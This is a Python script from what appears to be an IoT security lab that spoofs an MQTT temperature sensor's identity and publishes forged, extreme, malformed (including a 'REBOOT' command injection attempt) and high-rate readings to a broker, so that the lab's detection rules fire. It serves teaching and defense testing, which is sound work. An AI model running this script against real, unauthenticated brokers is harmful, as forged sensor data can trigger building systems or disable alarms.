# =============================================================================
# attacks/mqtt_spoof.py — MQTT Device Identity Spoofing Attack
# =============================================================================
# EDUCATIONAL PURPOSE ONLY — Do NOT run this against systems you don't own.
#
# This script simulates an attacker impersonating a legitimate IoT device
# by publishing fake sensor readings with a stolen/forged device ID.
#
# Real-world impact:
#   - Injecting false temperature data could trigger HVAC systems
#   - Faking door sensor = "OPEN" could disable alarm systems
#   - Spoofing motion sensors = "no motion" could allow physical intrusion
#
# Detection methods demonstrated:
#   1. Schema validation (attacker uses wrong payload structure)
#   2. Out-of-range value detection (malicious values)
#   3. Duplicate client ID detection (two devices with same ID)
#   4. Publishing rate anomaly (one device publishing too fast)
#
# MITRE ATT&CK ICS: T0865 - Spearphishing Attachment (adapted for IoT)
# CVE reference style: CWE-290 - Authentication Bypass by Spoofing
# =============================================================================

import paho.mqtt.client as mqtt
import json
import time
import random
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import config

# ── ATTACK MODES ─────────────────────────────────────────────────────────────
# Choose which spoofing scenario to demonstrate

SPOOF_SCENARIOS = {
    1: "Steal legitimate device ID and publish fake readings",
    2: "Inject extreme/alarming sensor values",
    3: "Publish to a topic with wrong payload schema",
    4: "Rapid spoofed messages (combined spoofing + DoS)",
}

# The attacker steals 'temp-sensor-01' identity
STOLEN_DEVICE_ID = "temp-sensor-01"

# How many spoofed messages to send per scenario
MESSAGES_PER_SCENARIO = 10
INTERVAL_BETWEEN_MSGS = 0.3     # 0.3 seconds = ~3 msgs/sec per stolen ID


def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("[Spoof Attack] ✅ Connected to broker under stolen identity!")
    else:
        print(f"[Spoof Attack] ❌ Connection failed (code {rc})")
        sys.exit(1)


# ─────────────────────────────────────────────────────────────────────────────
# PAYLOAD BUILDERS — each creates a different type of spoofed message
# ─────────────────────────────────────────────────────────────────────────────

def build_stolen_identity_payload():
    """Scenario 1: Looks identical to legitimate device, but isn't."""
    return json.dumps({
        "device_id":   STOLEN_DEVICE_ID,   # ← Stolen legitimate ID
        "device_type": "temperature_sensor",
        "room":        "living_room",
        "temperature": round(random.uniform(19.0, 23.0), 2),  # Plausible values
        "unit":        "celsius",
        "timestamp":   time.time()
        # NOTE: No 'spoofed' field — attacker tries to blend in
    })


def build_extreme_values_payload():
    """Scenario 2: Injects dangerous/alarming values to trigger actuators."""
    extreme_temp = random.choice([
        -50.0,   # Impossible indoor temperature — sensor malfunction?
        150.0,   # Fire condition trigger?
        0.0,     # Freeze alert?
    ])
    return json.dumps({
        "device_id":   STOLEN_DEVICE_ID,
        "device_type": "temperature_sensor",
        "room":        "living_room",
        "temperature": extreme_temp,        # ← Way outside valid range
        "unit":        "celsius",
        "timestamp":   time.time()
    })


def build_malformed_schema_payload():
    """Scenario 3: Wrong schema — might exploit parser vulnerabilities."""
    return json.dumps({
        "id":     STOLEN_DEVICE_ID,         # ← Wrong field name ('id' not 'device_id')
        "type":   "sensor",                 # ← Wrong field name
        "temp":   22.5,                     # ← Wrong field name (should be 'temperature')
        "extra":  "A" * 200,               # ← Oversized unexpected field
        "cmd":    "REBOOT",                 # ← Command injection attempt!
        "ts":     time.time()
    })


def build_rapid_spoof_payload(seq):
    """Scenario 4: High-speed spoofed messages — combined attack."""
    return json.dumps({
        "device_id":   STOLEN_DEVICE_ID,
        "device_type": "temperature_sensor",
        "room":        "living_room",
        "temperature": round(random.uniform(20.0, 25.0), 2),
        "unit":        "celsius",
        "seq":         seq,
        "timestamp":   time.time()
    })


# ─────────────────────────────────────────────────────────────────────────────
# FUNCTION: run_scenario
# Executes one spoofing scenario and reports results.
# ─────────────────────────────────────────────────────────────────────────────
def run_scenario(client, scenario_num):
    scenario_name = SPOOF_SCENARIOS.get(scenario_num, "Unknown")
    print(f"\n[Spoof Attack] 📋 Scenario {scenario_num}: {scenario_name}")
    print(f"[Spoof Attack] Sending {MESSAGES_PER_SCENARIO} spoofed messages...\n")

    for i in range(MESSAGES_PER_SCENARIO):
        # Select the right payload builder for this scenario
        if scenario_num == 1:
            payload = build_stolen_identity_payload()
            desc = "stolen identity"
        elif scenario_num == 2:
            payload = build_extreme_values_payload()
            desc = "extreme values"
        elif scenario_num == 3:
            payload = build_malformed_schema_payload()
            desc = "malformed schema"
        elif scenario_num == 4:
            payload = build_rapid_spoof_payload(i)
            desc = "rapid spoof"
        else:
            break

        result = client.publish(config.TOPIC_TEMPERATURE, payload, qos=1)
        status = "✅" if result.rc == mqtt.MQTT_ERR_SUCCESS else "❌"
        print(f"  [{i+1:02d}] {status} Published {desc} payload")

        time.sleep(INTERVAL_BETWEEN_MSGS)

    print(f"\n[Spoof Attack] ✔️  Scenario {scenario_num} complete.")


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    print("\n" + "=" * 60)
    print("  👤 MQTT SPOOFING ATTACK SIMULATION")
    print("=" * 60)
    print(f"  Target Broker    : {config.BROKER_HOST}:{config.BROKER_PORT}")
    print(f"  Stolen Device ID : {STOLEN_DEVICE_ID}")
    print(f"  Target Topic     : {config.TOPIC_TEMPERATURE}")
    print("\n  Spoofing Scenarios:")
    for num, desc in SPOOF_SCENARIOS.items():
        print(f"    [{num}] {desc}")
    print("=" * 60)
    print("  ⚠️  This will trigger MEDIUM/HIGH alerts in the monitor")
    print("=" * 60 + "\n")

    # Connect using the stolen device ID — broker allows this (no auth)
    # With authentication enabled, this would fail immediately
    client = mqtt.Client(client_id=STOLEN_DEVICE_ID)
    client.on_connect = on_connect

    try:
        client.connect(config.BROKER_HOST, config.BROKER_PORT, config.BROKER_KEEPALIVE)
    except ConnectionRefusedError:
        print("[Spoof Attack] ❌ Broker not reachable.")
        sys.exit(1)

    client.loop_start()
    time.sleep(0.5)

    print("[Spoof Attack] Starting in 3 seconds...")
    time.sleep(3)

    # Run all four spoofing scenarios in sequence
    try:
        for scenario_num in SPOOF_SCENARIOS.keys():
            run_scenario(client, scenario_num)
            print("[Spoof Attack] ⏸  Pausing 5s between scenarios...\n")
            time.sleep(5)

    except KeyboardInterrupt:
        print("\n[Spoof Attack] ⏹  Attack interrupted")

    print("\n[Spoof Attack] 🏁 All spoofing scenarios complete.")
    print("[Spoof Attack] Check detection/logs/alerts.log for triggered alerts.\n")

    client.loop_stop()
    client.disconnect()


if __name__ == "__main__":
    main()
